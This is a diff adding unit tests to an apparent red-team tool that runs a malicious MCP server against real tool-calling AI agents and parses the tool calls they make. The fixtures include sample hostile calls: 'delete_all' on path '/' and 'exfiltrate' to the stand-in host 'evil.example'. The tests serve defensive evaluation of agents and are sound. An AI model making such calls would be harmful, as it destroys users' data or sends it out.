@@ -53,3 +53,59 @@ describe("red-team CLI fails closed", () => {
     expect(cli).toContain("error.remediation");
   });
 });
+
+describe("G1-03: evil-MCP provider drives a real tool-calling agent", () => {
+  const source = readFileSync(new URL("../src/redteam/mcpAgentProvider.ts", import.meta.url), "utf8");
+
+  it("no longer models a hardcoded cautious agent", () => {
+    expect(source).not.toContain("function syntheticAgentResponse");
+    expect(source).not.toContain("CAUTIOUS agent");
+  });
+
+  it("offers the real tool definitions and observes actual tool calls", () => {
+    expect(source).toContain("resolveAgentResponder");
+    expect(source).toContain("responder.respond(scenario.userPrompt, { tools: offeredTools })");
+    expect(source).toContain("answer.toolCalls");
+  });
+
+  it("does not score an untested agent as perfectly safe", () => {
+    expect(source).not.toContain("/ totalScenarios\n        )\n      : 100;");
+    expect(source).toContain('totalScenarios === 0 ? "INSUFFICIENT_EVIDENCE" : "MEASURED"');
+  });
+});
+
+describe("responder tool-call extraction", () => {
+  it("parses OpenAI tool_calls including malformed arguments", async () => {
+    const { extractToolCalls } = await import("../src/assurance/agentResponder.js");
+    const calls = extractToolCalls({
+      choices: [
+        {
+          message: {
+            tool_calls: [
+              { function: { name: "delete_all", arguments: '{"path":"/"}' } },
+              { function: { name: "broken", arguments: "{not json" } }
+            ]
+          }
+        }
+      ]
+    });
+    expect(calls).toHaveLength(2);
+    expect(calls[0]).toEqual({ toolName: "delete_all", arguments: { path: "/" } });
+    // A dangerous call must never be silently dropped because its args failed to parse.
+    expect(calls[1].toolName).toBe("broken");
+    expect(calls[1].arguments._raw).toBe("{not json");
+  });
+
+  it("parses Anthropic tool_use blocks", async () => {
+    const { extractToolCalls } = await import("../src/assurance/agentResponder.js");
+    const calls = extractToolCalls({
+      content: [{ type: "tool_use", name: "exfiltrate", input: { host: "evil.example" } }]
+    });
+    expect(calls).toEqual([{ toolName: "exfiltrate", arguments: { host: "evil.example" } }]);
+  });
+
+  it("returns no calls for a plain text answer", async () => {
+    const { extractToolCalls } = await import("../src/assurance/agentResponder.js");
+    expect(extractToolCalls({ choices: [{ message: { content: "no tools" } }] })).toEqual([]);
+  });
+});
